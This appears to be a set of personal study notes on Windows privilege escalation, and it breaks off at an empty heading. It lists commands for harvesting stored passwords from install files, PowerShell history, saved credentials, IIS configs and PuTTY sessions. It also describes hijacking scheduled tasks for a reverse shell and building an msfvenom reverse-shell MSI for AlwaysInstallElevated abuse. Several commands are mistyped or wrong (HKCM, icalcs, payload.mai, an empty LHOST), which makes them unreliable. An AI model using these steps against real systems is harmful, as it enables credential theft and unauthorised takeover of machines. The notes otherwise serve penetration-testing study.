[] Groups type on windows:
	1. Administrators => these are the most powerful users in the system, they can do anything.
	2. Users => Standrds users can only perform limmited tasks
[] most common users:	
	- SYSTEM/LocalSyatem (admin)=> an account owned by the operating system and can do any task and has access to any resources, 
	- Local Service => default account to run windows services
	- Network Services

[] Harvesting Passwords from usual spots:
	1. unattended windows installations 
		c:\unattended
		c:\windows\panther\unattended.xml
		c:\windows\panther\unattended\unattended.xml
		c:\windows\system32\sysprep.inf
		c:\windows\system32\sysprep/sysprep.xml

	2. Powershell history => run this command in cmd.exe `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

	3. windows saved credentials => `cmdkey /list`
		- to switch from user to anther in cmd.exe => `runas /savecred /user:<admin> cmd.exe`

	4. IIS Configurations => IIS stores passwords in web.bonfig file, it can be found in

    - C:\inetpub\wwwroot\web.config
    - C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
    {} use `type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`

    5. Retrieve credentials from PuTTY => `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`

  [] some tricks:	
  	{} Scheduled Tasks => as cron jobs in linux therea are scheduled tasks in windows too.
  		- to list the sheduled tasks => `schtasks`
  		- to get more details about specific task => `schtasks /query /tn vulntask /fo list /v` => this command will give you lots of details about the task, but we need is the 'Task To Run' and 'Run As User' to know the task name and the user that will run the task.
  		- to know the task permissions => icalcs <task_path>
  		- if you can write in the task file you can use nc to abtain a reverse shell or write a payload to have a reverse shell
  		- you have to wait till the task run by itself
  		- if you have the permission to run it at any time you can run it using => `schtasks /run /tn vulntask`

  	{} AlwaysInstallElevated Method
  		- it is the windows installer files (.msi files) is used to install application and run with the user who created it andd can be configerd to run with a high preiveleged user
  		- to exploit this vuln the two following regestries should be set
  		`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`
   		`reg query HKCM\SOFTWARE\Policies\Microsoft\Windows\Installer`
   		- use the cmd to check if they are set or not, if they both are set
   		- `msfvenom -p windows/x64/shell_revers_tcp LHOST= LPORT -f msi -o payload.msi`
   		= to run the payload.msi in the target syatem use =>`msiexec /quiet /i C:\Windows\Temp\payload.mai`


  [] Abusing Service Misconfigurations:
  	- 